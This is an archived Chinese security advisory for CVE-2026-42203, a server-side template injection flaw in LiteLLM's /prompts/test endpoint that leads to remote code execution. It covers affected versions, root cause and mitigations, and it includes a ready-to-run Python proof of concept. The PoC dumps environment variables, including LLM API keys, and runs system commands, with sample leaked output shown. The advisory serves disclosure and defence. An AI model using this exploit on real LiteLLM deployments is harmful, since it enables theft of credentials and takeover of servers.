@@ -1,0 +1,16 @@
+---
+cve: "CVE-2026-42203"
+source: "gelusus/wxvl 公众号漏洞文库"
+---
+
+#  【高危AI漏洞预警】CVE-2026-42203｜LiteLLM AI Gateway 服务端模板注入远程代码执行（RCE）  
+ 飓风网络安全   2026-05-13 15:29  
+  
+![](https://mmbiz.qpic.cn/mmbiz_jpg/Yd9HAo0qc3ofVTqmmQfejqpDVnHn9sJvwLpic5KnaHnCicIg00Sm7FuCx3ibr5ppfADWvnldeFCQwCHGn0Cw3mCvthgBdqxmIHwdBmQdWJVoCc/640?wx_fmt=jpeg "")  
+  
+**一、漏洞概述**CVE-2026-42203 是 LiteLLM（BerriAI 旗下开源 AI Gateway/LLM 代理）在 /prompts/test 接口存在的服务端模板注入（SSTI）→ 远程代码执行（RCE）漏洞￼￼￼。• 影响版本：1.80.5 ≤ LiteLLM < 1.83.7￼￼￼• 修复版本：≥ 1.83.7（2026-05-07 发布）￼￼￼• 触发条件：只要拥有任意合法 LiteLLM Proxy API Key 即可利用（普通用户权限即可）￼￼￼• 危害后果：直接在 LiteLLM 服务进程中执行任意 Python 代码 → 窃取所有 LLM API Key、数据库密码、环境变量、服务器权限接管、植入后门￼￼￼该漏洞风险极高，所有使用 LiteLLM 代理的企业务必立即升级或阻断该接口。**二、漏洞基本信息**• 漏洞类型：服务端模板注入（SSTI）→ 远程代码执行（RCE）￼￼￼• CVSS 4.0：8.6（High）AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N• CWE：CWE-1336（模板引擎特殊元素未正确过滤）• 影响组件：LiteLLM（AI Proxy Gateway）￼￼￼• 触发接口：POST /prompts/test￼￼￼• 认证要求：需要合法 Proxy API Key（普通用户即可）￼￼￼• 修复方式：升级到 1.83.7+￼￼￼**三、漏洞原理**LiteLLM 的 /prompts/test 接口用于测试 Prompt 模板渲染功能，接收用户传入的模板字符串并在服务端直接渲染，未做任何沙箱隔离或模板语法过滤￼￼￼。核心问题：• 后端使用不安全的模板引擎直接解析用户可控模板• 模板中可直接嵌入 Python 表达式/代码• 认证仅校验 Proxy API Key，普通用户即可访问• 注入代码在 LiteLLM 主进程上下文执行，可访问全部环境变量、配置、密钥￼￼￼一句话总结：用户可控模板 → 无过滤渲染 → 任意 Python 代码执行 → 全权限接管。**四、环境复现（极简）**1. 安装受影响版本pip install litellm==1.83.62. 启动 LiteLLM（默认配置即可）litellm --port 4000服务监听：http://localhost:40003. 获取一个合法 Proxy API Key默认配置下，直接使用：sk-1234**五、漏洞利用 PoC（Python，直接可用）**下面给出完整可直接运行的 PoC，作用：• 触发 SSTI → 执行任意 Python 代码• 示例：读取系统环境变量（含所有 LLM API Key）、执行系统命令import requests# ==== 配置区 ====url = "http://localhost:4000/prompts/test"api_key = "sk-1234"  # 合法 Proxy API Key# =================headers = {    "Authorization": f"Bearer {api_key}",    "Content-Type": "application/json"}# 恶意模板：执行任意 Python 代码# 示例 1：读取环境变量（获取所有 LLM API Key）malicious_template = """{{% for k, v in os.environ.items() %}}{{k}} = {{v}}{{% endfor %}}"""# 示例 2：执行系统命令（id / whoami）# malicious_template = """# {{os.popen('id').read()}}# """data = {    "prompt": malicious_template,    "model": "gpt-3.5-turbo"}try:    resp = requests.post(url, headers=headers, json=data, timeout=10)    print("状态码:", resp.status_code)    print("响应内容:\n", resp.text)except Exception as e:    print("请求失败:", e)运行结果（成功示例）状态码: 200响应内容:OPENAI_API_KEY = sk-xxxxxxANTHROPIC_API_KEY = sk-ant-xxxxxxDATABASE_URL = postgres://user:pass@db:5432/litellm...uid=1000(user) gid=1000(user) groups=1000(user)说明：• 模板中直接使用 os 等内置模块，无需额外导入• 可执行任意 Python 代码：文件读写、反弹 Shell、植入后门、横向移动• 权限为 LiteLLM 进程权限（通常为 高权限/root）**六、攻击面与真实危害**1. 窃取全部 LLM 厂商 API Key滥用高额账单、数据泄露2. 读取数据库账号密码、JWT 密钥、敏感配置3. 服务器权限接管：执行系统命令、读写任意文件、植入持久化后门4. 横向移动：利用窃取凭证渗透内网其他服务5. 数据投毒/篡改：篡改 LLM 代理逻辑、劫持用户请求一句话：拿下 LiteLLM = 拿下整个 AI 基础设施。**七、修复与缓解方案**✅ 紧急修复（必做）立即升级 LiteLLM 至 ≥ 1.83.7pip install --upgrade litellm✅ 临时缓解（无法立即升级时）1. 禁用 /prompts/test 接口（Nginx/反向代理拦截）location /prompts/test {    deny all;    return 403;}2. 收紧 API Key 权限：禁止普通用户访问测试接口3. 网络隔离：仅内网可访问 LiteLLM 代理，禁止公网暴露✅ 长期安全建议• 开启 LiteLLM 严格模板沙箱（新版本默认开启）• 禁止模板中执行任意 Python 代码• 对所有用户可控输入做严格过滤/转义• 定期更新依赖，关注官方安全公告  
+
+
+---
+
+> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
